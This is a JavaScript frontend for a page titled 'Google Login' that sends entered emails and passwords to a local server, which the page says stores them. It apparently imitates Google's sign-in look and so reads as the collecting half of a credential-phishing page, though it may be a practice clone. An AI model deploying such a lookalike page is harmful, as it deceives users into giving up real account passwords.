// Frontend JavaScript for Google Login

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginForm = document.getElementById('loginForm');
const createBtn = document.getElementById('createAccountBtn');
const messageDiv = document.getElementById('messageContainer');
const serverStatus = document.getElementById('serverStatus');

// Server API endpoint
const API_URL = 'http://localhost:3000/api';

// Helper function to show messages
function showMessage(type, text) {
    messageDiv.className = 'message-area';
    if (type === 'error') {
        messageDiv.classList.add('error-message');
    } else if (type === 'success') {
        messageDiv.classList.add('success-message');
    } else {
        messageDiv.classList.add('info-message');
    }
    messageDiv.textContent = text;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

// Clear messages
function clearMessages() {
    messageDiv.style.display = 'none';
}

// Check server connection
async function checkServerConnection() {
    try {
        const response = await fetch(`${API_URL}/users`);
        if (response.ok) {
            serverStatus.innerHTML = '✅ Server connected: http://localhost:3000';
            serverStatus.style.background = '#e6f4ea';
            serverStatus.style.color = '#137333';
        }
    } catch (error) {
        serverStatus.innerHTML = '❌ Server not connected. Please make sure server is running on http://localhost:3000';
        serverStatus.style.background = '#fce8e6';
        serverStatus.style.color = '#c5221f';
        console.error('Server connection error:', error);
    }
}

// Handle login form submission
async function handleLogin(event) {
    event.preventDefault();
    clearMessages();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    
    // Validation
    if (!email) {
        showMessage('error', 'Please enter your email address');
        emailInput.focus();
        return;
    }
    
    if (!password) {
        showMessage('error', 'Please enter your password');
        passwordInput.focus();
        return;
    }
    
    // Show loading state
    const submitBtn = document.querySelector('.btn-next');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Sending...';
    submitBtn.disabled = true;
    
    try {
        // Send data to server
        console.log('📤 Sending login data to server:', { email, password: '***' });
        
        const response = await fetch(`${API_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ email, password })
        });
        
        const data = await response.json();
        
        console.log('📥 Server response:', data);
        
        if (data.success) {
            showMessage('success', `✅ ${data.message}`);
            // Clear form fields
            emailInput.value = '';
            passwordInput.value = '';
            
            // Optional: Add visual feedback
            emailInput.style.borderColor = '#34a853';
            passwordInput.style.borderColor = '#34a853';
            setTimeout(() => {
                emailInput.style.borderColor = '#dadce0';
                passwordInput.style.borderColor = '#dadce0';
            }, 2000);
        } else {
            showMessage('error', `❌ ${data.message}`);
        }
        
    } catch (error) {
        console.error('Error sending data to server:', error);
        showMessage('error', '❌ Could not connect to server. Make sure server is running on port 3000');
        serverStatus.innerHTML = '❌ Server connection failed. Please start the server using: node server.js';
        serverStatus.style.background = '#fce8e6';
        serverStatus.style.color = '#c5221f';
    } finally {
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
    }
}

// Handle create account button
function handleCreateAccount() {
    showMessage('info', '✨ New account? Just enter your email and password above and click Next! Your data will be saved on the server.');
}

// Event listeners
loginForm.addEventListener('submit', handleLogin);
createBtn.addEventListener('click', handleCreateAccount);

// Clear any pre-filled values on load
window.addEventListener('DOMContentLoaded', () => {
    emailInput.value = '';
    passwordInput.value = '';
    checkServerConnection();
    
    console.log('✅ Google Login page loaded');
    console.log('📡 Server API URL:', API_URL);
    console.log('💡 Tip: Open another terminal and run "node server.js" if server is not running');
});

// Auto-check server connection every 10 seconds
setInterval(checkServerConnection, 10000);
